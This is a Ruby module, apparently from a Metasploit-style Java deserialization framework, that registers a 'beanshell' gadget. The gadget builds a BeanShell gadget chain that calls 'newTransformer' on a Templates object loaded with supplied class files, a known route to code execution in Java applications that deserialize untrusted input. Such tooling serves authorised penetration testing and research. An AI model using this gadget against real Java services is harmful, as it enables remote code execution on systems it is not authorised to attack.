# -*- coding: binary -*-
require_relative '../../payloads/beanshell'
require_relative '../../payloads/templates'

S=Rex::Java::Serialization
class Beanshell < S::Generator::Gadget
  def id
    'beanshell'
  end

  def usable(ctx, params: {})
    return false unless ctx.gadget?('beanshell')

    unless params.fetch('classfiles', nil).nil?
      return false unless S::Generator::Templates.supported(ctx,params)
    end

    true
  end

  def create(ctx, params: {})
    ctx.reg.load('model/beanshell.json')

    if !params.fetch('classfiles', nil).nil?
      S::Payloads::Beanshell.make_invoke_noarg(
        S::Generator::Templates.make(ctx,params), 
        'newTransformer')
    else
      raise 'Missing parameters'
    end
  end
end

S::Generator.register(
  Beanshell.new
)
